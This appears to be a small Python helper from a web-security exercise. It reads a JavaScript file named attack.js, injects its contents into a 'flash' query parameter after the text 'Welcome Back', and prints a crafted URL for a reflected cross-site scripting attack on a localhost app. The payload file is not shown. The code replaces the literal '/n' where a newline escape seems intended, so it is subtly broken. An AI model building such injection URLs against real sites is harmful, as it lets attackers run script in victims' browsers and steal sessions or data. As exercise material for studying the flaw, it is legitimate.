from urllib.parse import urlencode

with open('attack.js') as f:
    query = {'flash': 'Welcome Back' + f.read().strip().replace('/n', ' ')}
print('http://localhost:5000/?' + urlencode(query))
